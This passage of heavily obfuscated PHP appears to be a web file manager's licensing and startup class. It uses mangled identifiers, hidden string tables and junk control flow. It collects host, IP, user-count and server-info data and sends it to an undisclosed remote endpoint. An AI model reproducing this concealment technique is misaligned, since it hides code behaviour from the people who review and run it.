$Ø¥˜¡ß =& $_SERVER[¦»×‡Ãã]; $øëã§¥ˆ =& $_SERVER[šÜÉ²œ]; if ($GLOBALS[$øëã§¥ˆ[13]][$øëã§¥ˆ[15]] != $øëã§¥ˆ[6]) { return; } $ñ¢íÇİÑ = $_SERVER[$øëã§¥ˆ[16]]; $¹Ğïîü¸ = $Ø¥˜¡ß[696]; if (strlen($¹Ğïîü¸) < $Ø¥˜¡ß[694]) { die; } $®ÖÚÁğ = $øëã§¥ˆ[17]; $°À«ñóÁ = $Ø¥˜¡ß[697]; if (!$°À«ñóÁ) { die; } if (!strstr($ñ¢íÇİÑ, $®ÖÚÁğ)) { return; } $”´Ğ‡—• = strrpos($ñ¢íÇİÑ, $®ÖÚÁğ); $ÛÎˆÔœ± = substr($ñ¢íÇİÑ, $”´Ğ‡—• + strlen($®ÖÚÁğ)); $Å³é Ö = $Ø¥˜¡ß[698]; preg_match_all($øëã§¥ˆ[18], $ÛÎˆÔœ±, $ç­ûäõ); $™æÈÛîÆ = $Ø¥˜¡ß[699]; while ($™æÈÛîÆ < $Ø¥˜¡ß[680]) { if ($™æÈÛîÆ >= 0) { break; } $™æÈÛîÆ++; } $ÛÎˆÔœ± = trim($ç­ûäõ[0][0], $øëã§¥ˆ[19]); $GLOBALS[$øëã§¥ˆ[13]][$øëã§¥ˆ[14]] = explode($øëã§¥ˆ[19], $ÛÎˆÔœ±); $ğ¿ŸƒÀ¸ = $Ø¥˜¡ß[700]; if (!$ğ¿ŸƒÀ¸) { return; } $GLOBALS[$øëã§¥ˆ[13]][$øëã§¥ˆ[15]] = implode($øëã§¥ˆ[0], $GLOBALS[$øëã§¥ˆ[13]][$øëã§¥ˆ[14]]); $‚‰Èôµï = $Ø¥˜¡ß[701]; } public function run() { $¡ƒÆƒ‹÷ =& $_SERVER[¦»×‡Ãã]; $Â¶íÑÎ² =& $_SERVER[šÜÉ²œ]; $this->nlay9c9ac8e5(); $şÍâêÓš = $¡ƒÆƒ‹÷[702]; if (!$şÍâêÓš) { return; } $this->xtoza770eab2(); $™††¿‰° = $¡ƒÆƒ‹÷[703]; $¢ôƒàè¾ = $GLOBALS[$Â¶íÑÎ²[13]][$Â¶íÑÎ²[14]]; $¶¶›ñˆÜ = $GLOBALS[$Â¶íÑÎ²[13]][$Â¶íÑÎ²[15]]; $Æä£¿›½ = $¡ƒÆƒ‹÷[704]; while (strlen($Æä£¿›½) < $¡ƒÆƒ‹÷[705]) { if (!$Æä£¿›½) { break; } $Æä£¿›½++; } define($Â¶íÑÎ²[20], isset($¢ôƒàè¾[0]) && $¢ôƒàè¾[0] ? $¢ôƒàè¾[0] : $this->defaultModule); $£¾ƒíÈÄ = $¡ƒÆƒ‹÷[706]; define($Â¶íÑÎ²[21], isset($¢ôƒàè¾[1]) && $¢ôƒàè¾[0] ? $¢ôƒàè¾[1] : $this->defaultController); define($Â¶íÑÎ²[22], isset($¢ôƒàè¾[2]) && $¢ôƒàè¾[0] ? $¢ôƒàè¾[2] : $this->defaultAction); define($Â¶íÑÎ²[23], MOD . $Â¶íÑÎ²[0] . ST . $Â¶íÑÎ²[0] . ACT); $_SERVER[$Â¶íÑÎ²[24]] = strtolower(ACTION); $this->autorun(); if (count($¢ôƒàè¾) >= 3) { $this->appRun($¶¶›ñˆÜ); } else { $this->appRun(ACTION); } } private $rncd81304194 = array(); private $eindaaa9dcf2 = ''; public function cihq47075b91() { $®ó›Ò¨Ü =& $_SERVER[¦»×‡Ãã]; $ÎÃ†êò =& $_SERVER[šÜÉ²œ]; $this->eztl01736c3f(); $this->irsd777ba351(); $ş…Ÿ’¨Å = $®ó›Ò¨Ü[707]; if (!$ş…Ÿ’¨Å) { die; } $this->ardo40db4489(); $²à»Ôéõ = $®ó›Ò¨Ü[708]; $this->tvfh887241ab(); $Ùù£µ¡ = $®ó›Ò¨Ü[709]; if (!$Ùù£µ¡) { return; } $this->wknp6f3453a0(); $ì’•®½Ğ = $®ó›Ò¨Ü[710]; $this->szaqdcad9223(); $this->veugd74d488d(); $„¢èşÛÎ = $®ó›Ò¨Ü[711]; if (strlen($„¢èşÛÎ) < $®ó›Ò¨Ü[705]) { return; } $this->tugb3fc47667($ÎÃ†êò[25], array($this, $ÎÃ†êò[26])); $this->tugb3fc47667($ÎÃ†êò[27], array($this, $ÎÃ†êò[28])); $this->tugb3fc47667($ÎÃ†êò[29], array($this, $ÎÃ†êò[30])); $”¬àòÛÆ = $®ó›Ò¨Ü[712]; if (strlen($”¬àòÛÆ) < $®ó›Ò¨Ü[694]) { die; } $this->tugb3fc47667($ÎÃ†êò[31], array($this, $ÎÃ†êò[32])); $–«êØĞ = $®ó›Ò¨Ü[713]; if (strlen($–«êØĞ) < $®ó›Ò¨Ü[684]) { return; } } public function yesf1a335c2b($ó–Š‹°€) { $Îá­¬ƒˆ =& $_SERVER[¦»×‡Ãã]; $ı¯˜éË‡ =& $_SERVER[šÜÉ²œ]; $‰ñï„—ş = Model($ı¯˜éË‡[33])->get(); $Å¸Ôõ…å = $Îá­¬ƒˆ[714]; if (strlen($Å¸Ôõ…å) < $Îá­¬ƒˆ[690]) { die; } $ûË©·¦  = array($ı¯˜éË‡[34], $ı¯˜éË‡[35], $ı¯˜éË‡[36], $ı¯˜éË‡[37], $ı¯˜éË‡[38], $ı¯˜éË‡[39], $ı¯˜éË‡[40], $ı¯˜éË‡[41], $ı¯˜éË‡[42], $ı¯˜éË‡[43], $ı¯˜éË‡[44], $ı¯˜éË‡[45], $ı¯˜éË‡[46], $ı¯˜éË‡[47], $ı¯˜éË‡[48], $ı¯˜éË‡[49], $ı¯˜éË‡[50], $ı¯˜éË‡[51], $ı¯˜éË‡[52], $ı¯˜éË‡[53], $ı¯˜éË‡[54], $ı¯˜éË‡[55], $ı¯˜éË‡[56], $ı¯˜éË‡[57], $ı¯˜éË‡[58], $ı¯˜éË‡[59], $ı¯˜éË‡[60], $ı¯˜éË‡[61], $ı¯˜éË‡[62], $ı¯˜éË‡[63], $ı¯˜éË‡[64], $ı¯˜éË‡[65], $ı¯˜éË‡[66], $ı¯˜éË‡[67], $ı¯˜éË‡[68], $ı¯˜éË‡[69], $ı¯˜éË‡[70], $ı¯˜éË‡[71], $ı¯˜éË‡[72], $ı¯˜éË‡[73], $ı¯˜éË‡[74], $ı¯˜éË‡[75], $ı¯˜éË‡[76], $ı¯˜éË‡[77], $ı¯˜éË‡[78], $ı¯˜éË‡[79], $ı¯˜éË‡[80], $ı¯˜éË‡[81], $ı¯˜éË‡[82], $ı¯˜éË‡[83], $ı¯˜éË‡[84], $ı¯˜éË‡[85]); foreach ($ûË©·¦  as $üæ ıÌú) { $ºô›Óç = $GLOBALS[$ı¯˜éË‡[86]][$ı¯˜éË‡[87]][$üæ ıÌú]; $ĞùõƒÃ„ = $Îá­¬ƒˆ[715]; if (isset($‰ñï„—ş[$üæ ıÌú])) { $ºô›Óç = $‰ñï„—ş[$üæ ıÌú]; } $ó–Š‹°€[$ı¯˜éË‡[88]][$ı¯˜éË‡[89]][$üæ ıÌú] = $ºô›Óç; } $ñã™Í = $ó–Š‹°€[$ı¯˜éË‡[88]][$ı¯˜éË‡[89]][$ı¯˜éË‡[46]]; $“¨Ñª÷Ğ = $Îá­¬ƒˆ[716]; if (strlen($“¨Ñª÷Ğ) < $Îá­¬ƒˆ[694]) { return; } unset($ó–Š‹°€[$ı¯˜éË‡[88]][$ı¯˜éË‡[90]][$ı¯˜éË‡[91]]); $ŞÙãŒ = $Îá­¬ƒˆ[717]; while ($ŞÙãŒ < $Îá­¬ƒˆ[694]) { if ($ŞÙãŒ >= 0) { break; } $ŞÙãŒ++; } unset($ó–Š‹°€[$ı¯˜éË‡[88]][$ı¯˜éË‡[90]][$ı¯˜éË‡[92]]); $ãë’ò¼ï = $Îá­¬ƒˆ[718]; if (strlen($ãë’ò¼ï) < $Îá­¬ƒˆ[694]) { die; } unset($ó–Š‹°€[$ı¯˜éË‡[88]][$ı¯˜éË‡[89]][$ı¯˜éË‡[46]]); $±Ô£Àäø = $Îá­¬ƒˆ[719]; if (!$±Ô£Àäø) { die; } unset($ó–Š‹°€[$ı¯˜éË‡[88]][$ı¯˜éË‡[89]][$ı¯˜éË‡[93]]); $ó–Š‹°€[$ı¯˜éË‡[88]][$ı¯˜éË‡[89]][$ı¯˜éË‡[94]] = array($ı¯˜éË‡[95] => (int) $ñã™Í[$ı¯˜éË‡[96]], $ı¯˜éË‡[97] => (int) _get($ñã™Í, $ı¯˜éË‡[98], 0)); $ÍáØ¿‹Ø = substr(md5($ı¯˜éË‡[99] . get_client_ip() . $‰ñï„—ş[$ı¯˜éË‡[100]]), 0, 15); $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[102]] = Mcrypt::encode(Session::sign(), $ÍáØ¿‹Ø, 3600 * 24); $³–¶«¾È = $Îá­¬ƒˆ[720]; if (!$³–¶«¾È) { die; } $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[103]] = Action($ı¯˜éË‡[104])->accessToken(); $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[105]] = md5($_SERVER[$ı¯˜éË‡[106]] . $‰ñï„—ş[$ı¯˜éË‡[100]]); $¹úÙòÑ = $Îá­¬ƒˆ[721]; $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[107]] = base64_encode(serverInfo()); $‹ûòÅÓ° = $Îá­¬ƒˆ[722]; while (strlen($‹ûòÅÓ°) < $Îá­¬ƒˆ[690]) { if (!$‹ûòÅÓ°) { break; } $‹ûòÅÓ°++; } $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[108]] = $this->eindaaa9dcf2; $æĞ–ğ¡µ = $Îá­¬ƒˆ[723]; if ($‰ñï„—ş[$ı¯˜éË‡[108]] != $ı¯˜éË‡[109]) { $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[110]] = $‰ñï„—ş[$ı¯˜éË‡[110]]; $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[111]] = $‰ñï„—ş[$ı¯˜éË‡[111]]; $­éÑü‰ = rand_string(10) . $this->eindaaa9dcf2 . rand_string(5); $ó–Š‹°€[$ı¯˜éË‡[88]][$ı¯˜éË‡[112]][$ı¯˜éË‡[113]] = $this->xevrf4f66e9a($­éÑü‰, $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[105]]); } if ($this->eindaaa9dcf2 == $ı¯˜éË‡[109]) { $ó–Š‹°€[$ı¯˜éË‡[88]][$ı¯˜éË‡[89]][$ı¯˜éË‡[94]][$ı¯˜éË‡[98]] = 0; } $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[114]] = $this->versionPluginFilter(); $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[115]] = _get($this->rncd81304194, $ı¯˜éË‡[116], $ı¯˜éË‡[6]); if (KodUser::isRoot() && $this->config[$ı¯˜éË‡[117]]) { $ó–Š‹°€[$ı¯˜éË‡[101]][$ı¯˜éË‡[118]] = WEB_ROOT; } return $ó–Š‹°€; } private function szaqdcad9223() { $•¶÷ÜÎ· =& $_SERVER[¦»×‡Ãã]; $¤Ï†‡ü‹ =& $_SERVER[šÜÉ²œ]; $óóöÓ’½ = $_SERVER[$¤Ï†‡ü‹[24]] == $¤Ï†‡ü‹[119]; if ($_SERVER[$¤Ï†‡ü‹[24]] == $¤Ï†‡ü‹[120] && $_GET[$¤Ï†‡ü‹[121]] == $¤Ï†‡ü‹[122]) { $óóöÓ’½ = !0; } if ($óóöÓ’½) { $©ãß„Ü‘ = array($¤Ï†‡ü‹[108] => $this->eindaaa9dcf2, $¤Ï†‡ü‹[123] => $this->ovekbba1a6a4(), $¤Ï†‡ü‹[124] => Model($¤Ï†‡ü‹[125])->count()); if ($this->eindaaa9dcf2 != $¤Ï†‡ü‹[109]) { $ÃÁ€Û›É = _get($this->rncd81304194, $¤Ï†‡ü‹[126]); if ($ÃÁ€Û›É) { $©ãß„Ü‘[$¤Ï†‡ü‹[127]] = $ÃÁ€Û›É; $©ãß„Ü‘[$¤Ï†‡ü‹[128]] = strtotime(_get($this->rncd81304194, $¤Ï†‡ü‹[129])); $©ãß„Ü‘[$¤Ï†‡ü‹[130]] = _get($this->rncd81304194, $¤Ï†‡ü‹[116]); } $şÔ´óÚ¾ = Model($¤Ï†‡ü‹[33])->get($¤Ï†‡ü‹[131], $¤Ï†‡ü‹[6], !0); if (is_string($şÔ´óÚ¾) && substr($şÔ´óÚ¾, 0, 1) == $¤Ï†‡ü‹[132]) { $şÔ´óÚ¾ = json_decode_force($şÔ´óÚ¾); } if (is_array($şÔ´óÚ¾) && $şÔ´óÚ¾[$¤Ï†‡ü‹[133]] && strstr($şÔ´óÚ¾[$¤Ï†‡ü‹[133]], $¤Ï†‡ü‹[134])) { $Ó“ÈğÛ = explode($¤Ï†‡ü‹[134], $şÔ´óÚ¾[$¤Ï†‡ü‹[133]]); $©ãß„Ü‘[$¤Ï†‡ü‹[135]] = $Ó“ÈğÛ[0]; } } $©ãß„Ü‘ = $this->vidyceeff10d(json_encode($©ãß„Ü‘), md5($¤Ï†‡ü‹[136])); $û·ÒÈÑ = array($¤Ï†‡ü‹[137] => $©ãß„Ü‘); $á‘Î¯… = $•¶÷ÜÎ·[724]; if (strlen($á‘Î¯…) < $•¶÷ÜÎ·[684]) { return; } call_user_func(array($¤Ï†‡ü‹[138], $¤Ï†‡ü‹[139]), $û·ÒÈÑ); $âÂ–›ÈÕ = $•¶÷ÜÎ·[725]; } if ($this->eindaaa9dcf2 == $¤Ï†‡ü‹[109]) { return; } $·²İÓ¹ø = array($¤Ï†‡ü‹[140], $¤Ï†‡ü‹[141], $¤Ï†‡ü‹[142], $¤Ï†‡ü‹[143], $¤Ï†‡ü‹[144], $¤Ï†‡ü‹[145]); $ãßµÂŞŒ = Model($¤Ï†‡ü‹[33])->get(); $û·ÒÈÑ = array($¤Ï†‡ü‹[146] => $ãßµÂŞŒ[$¤Ï†‡ü‹[34]], $¤Ï†‡ü‹[147] => $ãßµÂŞŒ[$¤Ï†‡ü‹[35]], $¤Ï†‡ü‹[148] => $¤Ï†‡ü‹[6]); $òÅÕ÷°„ = $•¶÷ÜÎ·[726]; if (strlen($òÅÕ÷°„) < $•¶÷ÜÎ·[680]) { die; } foreach ($·²İÓ¹ø as $ÔÌ–ìîú) { if (!isset($ãßµÂŞŒ[$ÔÌ–ìîú]) || !$ãßµÂŞŒ[$ÔÌ–ìîú]) { continue; } $û·ÒÈÑ[$ÔÌ–ìîú] = $ãßµÂŞŒ[$ÔÌ–ìîú]; } call_user_func(array($¤Ï†‡ü‹[138], $¤Ï†‡ü‹[139]), $û·ÒÈÑ); } private function tvfh887241ab() { $ŠìÙËÓé =& $_SERVER[¦»×‡Ãã]; $ˆ©İ”ˆ¯ =& $_SERVER[šÜÉ²œ]; if ($_SERVER[$ˆ©İ”ˆ¯[24]] != $ˆ©İ”ˆ¯[149]) { return; } if (!KodUser::isRoot()) { die; } $¾½§âÂì = $GLOBALS[$ˆ©İ”ˆ¯[13]]; if (isset($¾½§âÂì[$ˆ©İ”ˆ¯[150]])) { $this->bonk131f69b7(); die; } if (isset($¾½§âÂì[$ˆ©İ”ˆ¯[151]]) && isset($¾½§âÂì[$ˆ©İ”ˆ¯[151]]) == $ˆ©İ”ˆ¯[122]) { $¾½§âÂì[$ˆ©İ”ˆ¯[152]] = Model($ˆ©İ”ˆ¯[33])->get($ˆ©İ”ˆ¯[153]); } if (!isset($¾½§âÂì[$ˆ©İ”ˆ¯[152]]) || strlen($¾½§âÂì[$ˆ©İ”ˆ¯[152]]) != 16) { show_json($ˆ©İ”ˆ¯[154] . $¾½§âÂì[$ˆ©İ”ˆ¯[152]], !1); } $£÷öä´¨ = Model($ˆ©İ”ˆ¯[33])->get($ˆ©İ”ˆ¯[100]); $ŸôØ‚¬‡ = md5($_SERVER[$ˆ©İ”ˆ¯[106]] . $£÷öä´¨); $´Ş¥ûı± = array($ˆ©İ”ˆ¯[152] => $¾½§âÂì[$ˆ©İ”ˆ¯[152]], $ˆ©İ”ˆ¯[155] => rand_string(16), $ˆ©İ”ˆ¯[156] => $ˆ©İ”ˆ¯[136], $ˆ©İ”ˆ¯[157] => $ˆ©İ”ˆ¯[158], $ˆ©İ”ˆ¯[159] => $_SERVER[$ˆ©İ”ˆ¯[160]], $ˆ©İ”ˆ¯[161] => $_SERVER[$ˆ©İ”ˆ¯[162]], $ˆ©İ”ˆ¯[163] => $_SERVER[$ˆ©İ”ˆ¯[164]], $ˆ©İ”ˆ¯[105] => $ŸôØ‚¬‡, $ˆ©İ”ˆ¯[165] => Model($ˆ©İ”ˆ¯[33])->get($ˆ©İ”ˆ¯[131])); $Â™¶µ¤É = $ŠìÙËÓé[727]; if (strlen($Â™¶µ¤É) < $ŠìÙËÓé[684]) { return; } if (isset($¾½§âÂì[$ˆ©İ”ˆ¯[151]]) && isset($¾½§âÂì[$ˆ©İ”ˆ¯[151]]) == $ˆ©İ”ˆ¯[122]) { $´Ş¥ûı±[$ˆ©İ”ˆ¯[151]] = md5($´Ş¥ûı±[$ˆ©İ”ˆ¯[152]] . $ˆ©İ”ˆ¯[166] . $´Ş¥ûı±[$ˆ©İ”ˆ¯[155]]); } if ($¾½§âÂì[$ˆ©İ”ˆ¯[167]] == $ˆ©İ”ˆ¯[168]) { $•Õ•³™÷ = $this->vidyceeff10d($ŸôØ‚¬‡, $ˆ©İ”ˆ¯[169]); $°Öß¾ËÛ = $this->xevrf4f66e9a(json_encode($´Ş¥ûı±), $ŸôØ‚¬‡ . $ˆ©İ”ˆ¯[170], 3); $°Öß¾ËÛ = $°Öß¾ËÛ . $ˆ©İ”ˆ¯[171] . $_SERVER[$ˆ©İ”ˆ¯[160]]; $§«ûŠŸ = $this->mtvpd67e011e($ˆ©İ”ˆ¯[172] . $•Õ•³™÷ . $ˆ©İ”ˆ¯[173] . $°Öß¾ËÛ, -1); show_json($§«ûŠŸ, !0); } else { if ($¾½§âÂì[$ˆ©İ”ˆ¯[167]] == $ˆ©İ”ˆ¯[174]) { $Şæ±µÒ = substr(md5($ˆ©İ”ˆ¯[175] . $ŸôØ‚¬‡), 12, 15) . $ˆ©İ”ˆ¯[176]; $°Öß¾ËÛ = $this->xrydf0469844(trim($¾½§âÂì[$ˆ©İ”ˆ¯[177]]), $Şæ±µÒ, 2); $ÅÄÏ§†‹ = json_decode($°Öß¾ËÛ, !0); if (!is_array($ÅÄÏ§†‹) || !is_array($ÅÄÏ§†‹[$ˆ©İ”ˆ¯[178]]) || $ÅÄÏ§†‹[$ˆ©İ”ˆ¯[152]] != !0) { $§Å›¼àĞ = $ˆ©İ”ˆ¯[179]; $««Ï³¢¨ = $ÅÄÏ§†‹[$ˆ©İ”ˆ¯[178]] ? $ˆ©İ”ˆ¯[180] . $ÅÄÏ§†‹[$ˆ©İ”ˆ¯[178]] : $§Å›¼àĞ; show_json($««Ï³¢¨, !1); } else { $´Ş¥ûı±[$ˆ©İ”ˆ¯[155]] = $ÅÄÏ§†‹[$ˆ©İ”ˆ¯[178]][$ˆ©İ”ˆ¯[181]]; } } else { $ÅÄÏ§†‹ = $this->mtvpd67e011e($ˆ©İ”ˆ¯[182], $´Ş¥ûı±, 10); } } if (!is_array($ÅÄÏ§†‹) || !is_array($ÅÄÏ§†‹[$ˆ©İ”ˆ¯[178]]) || $ÅÄÏ§†‹[$ˆ©İ”ˆ¯[152]] != !0) { $§Å›¼àĞ = LNG($ˆ©İ”ˆ¯[183]); $««Ï³¢¨ = $ÅÄÏ§†‹[$ˆ©İ”ˆ¯[178]] ? $ˆ©İ”ˆ¯[180] . $ÅÄÏ§†‹[$ˆ©İ”ˆ¯[178]] : $§Å›¼àĞ; show_json($««Ï³¢¨, !1); } $ä¥›ñ…õ = $ÅÄÏ§†‹[$ˆ©İ”ˆ¯[178]]; $¹ÄàæÖò = $this->zrlw14f0f707($ä¥›ñ…õ[$ˆ©İ”ˆ¯[184]]); $­ğÍ±£¤ = $ŠìÙËÓé[728]; while (strlen($­ğÍ±£¤) < $ŠìÙËÓé[690]) { if (!$­ğÍ±£¤) { break; } $­ğÍ±£¤++; } if (!$¹ÄàæÖò || $¹ÄàæÖò != $ä¥›ñ…õ[$ˆ©İ”ˆ¯[129]]) { $û¬ìÛ† = array($ˆ©İ”ˆ¯[185] => Model($ˆ©İ”ˆ¯[33])->get($ˆ©İ”ˆ¯[100]), $ˆ©İ”ˆ¯[186] => $_SERVER[$ˆ©İ”ˆ¯[106]], $ˆ©İ”ˆ¯[187] => this_url(), $ˆ©İ”ˆ¯[161] => $_SERVER[$ˆ©İ”ˆ¯[162]]); $°Öß¾ËÛ = $this->ythj5b9ebc50(json_encode($û¬ìÛ†)); $this->mtvpd67e011e($ˆ©İ”ˆ¯[188] . $°Öß¾ËÛ); show_json(LNG($ˆ©İ”ˆ¯[189]), !0); } $‘è¯¼Ã¨ = array($ˆ©İ”ˆ¯[153] => $ä¥›ñ…õ[$ˆ©İ”ˆ¯[190]], $ˆ©İ”ˆ¯[191] => $ä¥›ñ…õ[$ˆ©İ”ˆ¯[192]], $ˆ©İ”ˆ¯[193] => rand_string(16), $ˆ©İ”ˆ¯[108] => $ä¥›ñ…õ[$ˆ©İ”ˆ¯[194]]); if ($´Ş¥ûı±[$ˆ©İ”ˆ¯[155]]) { $‘è¯¼Ã¨[$ˆ©İ”ˆ¯[193]] = $´Ş¥ûı±[$ˆ©İ”ˆ¯[155]]; } $´ÉÔŒ…Ö = substr(md5($‘è¯¼Ã¨[$ˆ©İ”ˆ¯[191]]), 10, 10); $ŠÚ²˜Ô¿ = $´ÉÔŒ…Ö . $‘è¯¼Ã¨[$ˆ©İ”ˆ¯[108]] . $‘è¯¼Ã¨[$ˆ©İ”ˆ¯[193]]; $áÑ¥‹¡Ê = $ŠìÙËÓé[729]; $‘è¯¼Ã¨[$ˆ©İ”ˆ¯[110]] = strrev(base64_encode($this->vidyceeff10d($ŠÚ²˜Ô¿, $ˆ©İ”ˆ¯[195]))); $–ÜåîğŞ = $ŠìÙËÓé[730]; if (!$–ÜåîğŞ) { die; } $«´–Ï¯± = rand_string(16); $òïŠîåˆ = $«´–Ï¯± . $‘è¯¼Ã¨[$ˆ©İ”ˆ¯[108]] . $this->vidyceeff10d(md5($‘è¯¼Ã¨[$ˆ©İ”ˆ¯[153]]), $«´–Ï¯±); $‘è¯¼Ã¨[$ˆ©İ”ˆ¯[111]] = base64_encode(strrev($this->vidyceeff10d($òïŠîåˆ, $ˆ©İ”ˆ¯[196]))); if ($ä¥›ñ…õ[$ˆ©İ”ˆ¯[197]] && $ä¥›ñ…õ[$ˆ©İ”ˆ¯[197]] >= 1) { Model($ˆ©İ”ˆ¯[33])->setDeep($ˆ©İ”ˆ¯[198], $ˆ©İ”ˆ¯[122]); } Model($ˆ©İ”ˆ¯[33])->set($‘è¯¼Ã¨); $–€îµõñ = md5($_SERVER[$ˆ©İ”ˆ¯[106]] . strrev($£÷öä´¨) . $‘è¯¼Ã¨[$ˆ©İ”ˆ¯[191]]); $‡¡’ÏÊ = $ŠìÙËÓé[731]; $ë€”á¢À = strrev(substr($–€îµõñ, 10, 16)); $ùĞÌÚÈ× = $this->xevrf4f66e9a(json_encode($ä¥›ñ…õ), $–€îµõñ); $ØÒŠì¢Ó = array_to_keyvalue(Model($ˆ©İ”ˆ¯[7])->listData(), $ˆ©İ”ˆ¯[199]); $µ‘„®Ñª = $ØÒŠì¢Ó[$ˆ©İ”ˆ¯[200]]; $Õõ“Ûã = $ŠìÙËÓé[732]; if (strlen($Õõ“Ûã) < $ŠìÙËÓé[684]) { die; } $µã±Àôé = array(); $ºÆ­à¶¬ = $ŠìÙËÓé[733]; $µã±Àôé[$ë€”á¢À] = $ùĞÌÚÈ×; Model($ˆ©İ”ˆ¯[7])->update($µ‘„®Ñª[$ˆ©İ”ˆ¯[201]], array($ˆ©İ”ˆ¯[202] => $µã±Àôé)); $this->rncd81304194 = $ä¥›ñ…õ; $€èİœŞğ = $ŠìÙËÓé[720]; if (!$€èİœŞğ) { return; } $this->eindaaa9dcf2 = $‘è¯¼Ã¨[$ˆ©İ”ˆ¯[108]]; $this->licenseRegistSuccess(); Cache::set($ˆ©İ”ˆ¯[203] . md5($£÷öä´¨ . $ˆ©İ”ˆ¯[204]), $ˆ©İ”ˆ¯[6]); $šôØ¡â™ = $ŠìÙËÓé[734]; if (!$šôØ¡â™) { die; } show_json(LNG($ˆ©İ”ˆ¯[189]), !0); $ÚÍó’èÎ = $ŠìÙËÓé[735]; } private function licenseRegistSuccess() { $áå²“Ôª =& $_SERVER[šÜÉ²œ]; $À¥ææ«ƒ = Model($áå²“Ôª[33])->get(); if ($À¥ææ«ƒ[$áå²“Ôª[63]] != $áå²“Ôª[122]) { Model($áå²“Ôª[33])->set($áå²“Ôª[63], $áå²“Ôª[122]); } Action($áå²“Ôª[205])->initStart(!0); } private function bonk131f69b7() { $½Ÿï–¬ =& $_SERVER[¦»×‡Ãã]; $úüÙŒ¸ô =& $_SERVER[šÜÉ²œ]; Model($úüÙŒ¸ô[33])->set(array($úüÙŒ¸ô[153] => $úüÙŒ¸ô[6], $úüÙŒ¸ô[191] => $úüÙŒ¸ô[6], $úüÙŒ¸ô[108] => $úüÙŒ¸ô[109], $úüÙŒ¸ô[110] => $úüÙŒ¸ô[6], $úüÙŒ¸ô[111] => $úüÙŒ¸ô[6])); Model($úüÙŒ¸ô[33])->setDeep($úüÙŒ¸ô[198], $úüÙŒ¸ô[206]); $İßñßŒ¶ = $½Ÿï–¬[736]; while ($İßñßŒ¶ < $½Ÿï–¬[690]) { if ($İßñßŒ¶ >= 0) { break; } $İßñßŒ¶++; } $this->rncd81304194 = array(); $this->eindaaa9dcf2 = $úüÙŒ¸ô[109]; $ÌÑãô± = $½Ÿï–¬[737]; while (strlen($ÌÑãô±) < $½Ÿï–¬[690]) { if (!$ÌÑãô±) { break; } $ÌÑãô±++; } } private function eztl01736c3f() { $Àï²…×× =& $_SERVER[¦»×‡Ãã]; $™ÈäÌ÷½ =& $_SERVER[šÜÉ²œ]; $_SERVER[$™ÈäÌ÷½[162]] = _get($_SERVER, $™ÈäÌ÷½[162], APP_HOST); $this->eindaaa9dcf2 = $™ÈäÌ÷½[109]; $¢ûŞ±íÌ = $Àï²…××[738]; if (!$¢ûŞ±íÌ) { die; } $—ÁÒÈ¨ = Model($™ÈäÌ÷½[33])->get(); if ($—ÁÒÈ¨[$™ÈäÌ÷½[108]] == $™ÈäÌ÷½[109]) { return; } $Ò¥½¾®˜ = Model($™ÈäÌ÷½[33])->get($™ÈäÌ÷½[100]); $Ø§çŞÁ = $Àï²…××[686]; if (!$Ø§çŞÁ) { die; } $¢ÇŞß“É = $™ÈäÌ÷½[203] . md5($Ò¥½¾®˜ . $™ÈäÌ÷½[204]); $ï»œ®ƒŸ = Cache::get($¢ÇŞß“É); $ó—‘ı›ù = $Àï²…××[739]; if (strlen($ó—‘ı›ù) < $Àï²…××[680]) { return; } if (!is_array($ï»œ®ƒŸ) || !isset($ï»œ®ƒŸ[$™ÈäÌ÷½[207]]) || time() - $ï»œ®ƒŸ[$™ÈäÌ÷½[207]] >= 60) { $Ñ»»Ú©ş = Model($™ÈäÌ÷½[7])->loadList(); $ÀÉàï“ˆ = $Ñ»»Ú©ş[$™ÈäÌ÷½[200]]; $Ô™êÈÔ = md5($_SERVER[$™ÈäÌ÷½[106]] . strrev($Ò¥½¾®˜) . $—ÁÒÈ¨[$™ÈäÌ÷½[191]]); $ş£Œ“Ì› = strrev(substr($Ô™êÈÔ, 10, 16)); $ï»œ®ƒŸ = $this->xrydf0469844($ÀÉàï“ˆ[$™ÈäÌ÷½[86]][$ş£Œ“Ì›], $Ô™êÈÔ); $ï»œ®ƒŸ = json_decode($ï»œ®ƒŸ, !0); } if (!is_array($ï»œ®ƒŸ)) { return $this->bonk131f69b7(); } $ËöÄŸ„Ø = strtotime($ï»œ®ƒŸ[$™ÈäÌ÷½[129]]); if (time() >= $ËöÄŸ„Ø) { return $this->bonk131f69b7(); } if (!isset($ï»œ®ƒŸ[$™ÈäÌ÷½[207]]) || time() - $ï»œ®ƒŸ[$™ÈäÌ÷½[207]] > 20) { $ï»œ®ƒŸ[$™ÈäÌ÷½[207]] = time(); Cache::set($¢ÇŞß“É, $ï»œ®ƒŸ); } $this->rncd81304194 = $ï»œ®ƒŸ; $this->eindaaa9dcf2 = $—ÁÒÈ¨[$™ÈäÌ÷½[108]]; } private function irsd777ba351() { $Û¶ş°íÃ =& $_SERVER[šÜÉ²œ]; $ñá®«Áµ = $GLOBALS[$Û¶ş°íÃ[13]]; $ô¾…ÚØÆ = $_SERVER[$Û¶ş°íÃ[24]]; if ($ô¾…ÚØÆ == $Û¶ş°íÃ[208] && $this->eindaaa9dcf2 == $Û¶ş°íÃ[109]) { show_json(LNG($Û¶ş°íÃ[209]), !1, $Û¶ş°íÃ[210]); } $ó—Šøî = array($Û¶ş°íÃ[211], $Û¶ş°íÃ[212]); if (in_array($ô¾…ÚØÆ, $ó—Šøî)) { if ($this->eindaaa9dcf2 == $Û¶ş°íÃ[109] && isset($ñá®«Áµ[$Û¶ş°íÃ[213]])) { show_json(LNG($Û¶ş°íÃ[209]), !1, $Û¶ş°íÃ[210]); die; } $ÖÜ–ÎÇš = $this->ovekbba1a6a4(); if ($ÖÜ–ÎÇš != intval($Û¶ş°íÃ[214])) { if ($ÖÜ–ÎÇš <= Model($Û¶ş°íÃ[125])->count()) { show_json(LNG($Û¶ş°íÃ[215]), !1, $Û¶ş°íÃ[210]); die; } } } } private function 